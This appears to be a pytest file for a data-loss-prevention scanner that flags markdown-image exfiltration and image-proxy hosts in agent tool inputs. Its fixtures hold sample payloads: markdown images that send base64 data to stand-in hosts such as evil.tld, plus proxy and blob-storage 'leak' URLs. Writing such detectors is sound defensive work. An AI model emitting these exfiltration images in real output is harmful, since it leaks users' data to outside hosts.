"""Markdown image exfil DLP rules — shipped manifest, json.dumps scan path."""

from __future__ import annotations

import json
import re

import pytest

from core.audit.dlp import scan
from core.audit.dlp.loader import load_dlp_rules
from core.audit.dlp.scanner import reset_rules
from core.config import settings

MARKDOWN_RULE = "markdown_image_exfil"
PROXY_RULE = "image_proxy_exfil_host"


@pytest.fixture(autouse=True)
def _reset_dlp_cache():
    reset_rules()
    yield
    reset_rules()


def _pattern(rule_id: str) -> str:
    for rule in load_dlp_rules(settings.dlp_rules_path):
        if rule.id == rule_id:
            return rule.pattern
    raise AssertionError(f"{rule_id} missing from manifest")


def _rule_ids(verdict) -> list[str]:
    return [m.rule_id for m in (verdict.matches or [])]


def test_markdown_pattern_matches_json_dumps_form():
    rx = re.compile(_pattern(MARKDOWN_RULE))
    raw = "![leak](https://evil.tld/log?d=SGVsbG8gV29ybGQhSGVsbG8gV29ybGQhSGVsbG8gV29ybGQh)"
    assert rx.search(raw)
    assert rx.search(json.dumps({"content": raw}))


@pytest.mark.parametrize(
    "label,payload",
    [
        (
            "markdown image query exfil",
            {"tool_input": {"content": "![x](https://evil.tld/log?d=SGVsbG8gV29ybGQhSGVsbG8gV29ybGQhSGVsbG8gV29ybGQh)"}},
        ),
        (
            "write body with exfil markdown",
            {"tool_input": {"path": "notes/out.md", "content": "See ![img](https://x.tld/?payload=YWJjZGVmZ2hpams="
             "YWJjZGVmZ2hpams=YWJjZGVmZ2hpams=YWJjZGVmZ2hpams=)"}},
        ),
        (
            "camo proxy host",
            {"tool_input": {"content": "fetch https://camo.githubusercontent.com/abc123/def456"}},
        ),
        (
            "azure blob host",
            {"tool_input": {"url": "https://acct.blob.core.windows.net/leak/data"}},
        ),
    ],
)
def test_exfil_rules_detect(label, payload):
    verdict = scan("Edit", payload, mode="log")
    assert verdict.matched, f"missed: {label}"
    assert MARKDOWN_RULE in _rule_ids(verdict) or PROXY_RULE in _rule_ids(verdict)


@pytest.mark.parametrize(
    "label,payload",
    [
        ("plain logo", {"tool_input": {"content": "![logo](https://example.com/logo.png)"}}),
        ("shields badge", {"tool_input": {"content": "![build](https://img.shields.io/badge/build-passing-green)"}}),
        ("normal link", {"tool_input": {"content": "[docs](https://example.com/docs)"}}),
        ("github readme", {"tool_input": {"content": "## Setup\n\nRun `npm install`."}}),
    ],
)
def test_exfil_rules_reject_benign(label, payload):
    verdict = scan("Edit", payload, mode="log")
    assert MARKDOWN_RULE not in _rule_ids(verdict), f"markdown FP: {label}"
    assert PROXY_RULE not in _rule_ids(verdict), f"proxy FP: {label}"
